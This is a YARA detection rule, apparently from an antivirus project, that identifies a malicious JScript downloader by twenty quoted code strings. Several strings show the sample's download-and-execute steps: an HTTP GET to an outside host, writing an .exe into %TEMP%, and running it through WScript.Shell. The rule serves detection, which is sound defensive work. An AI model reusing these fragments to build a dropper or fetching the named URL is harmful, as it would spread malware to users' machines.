rule sig_20160328_78d55f5ee55e3cbaf97d0caa0ec21f80 {
  meta:
    description = "datamaliciousorder - file 20160328_78d55f5ee55e3cbaf97d0caa0ec21f80.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "303ac853bf42b252312a4bc7c4932dfccab609adfed5804b83f5452a20c4bcab"

  strings:
    $s1  = "function Drvrgvmo() {return Gfcnhqvsyo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ye2JDwePgRkM2.exe\";};" fullword ascii
    $s2  = "Oehnvw[Hcsyqvkfg](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Dfzcnyqcv](Ployugg() * 11)} while (Oehnvw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Pwoamptaph(Vnrffacyiu, Nvagik){return Vnrffacyiu - Nvagik;};" fullword ascii
    $s5  = "var Gfcnhqvsyo = function Sydioupzy() {return WScript[Ytwzwz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Yzxyelagl(Wnfav){Gfcnhqvsyo[\"Run\"](Wnfav, Kstdwf, Kstdwf);};" fullword ascii
    $s7  = "function Qtuyyxpqk() {return ((Slmzv == true) && (Slmzv == Ftdvqfvr)) ? 1 : Kstdwf;};" fullword ascii
    $s8  = "var Ftdvqfvr = false;" fullword ascii
    $s9  = "function Aliemg()" fullword ascii
    $s10 = "var Qxzdlzxd = false;" fullword ascii
    $s11 = " while (Dkiymtnt){" fullword ascii
    $s12 = "var Slmzv = false;" fullword ascii
    $s13 = "function Zkhnlr(){return Uarpmb;};" fullword ascii
    $s14 = "Ftdvqfvr = true; " fullword ascii
    $s15 = "function Ployugg(){return 22;};" fullword ascii
    $s16 = "Slmzv = true; " fullword ascii
    $s17 = "return Pwoamptaph(Vmzacpohpi, Gblggklmy);" fullword ascii
    $s18 = "var Vkslsjrbx = new this[\"Date\"]();" fullword ascii
    $s19 = "function Ayvxql(){return Ytwzwz;};" fullword ascii
    $s20 = "function Xjara(Xhacacdct) {var Yriyxxkytr = (1, 2, 3, 4, 5, Xhacacdct); return Yriyxxkytr;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}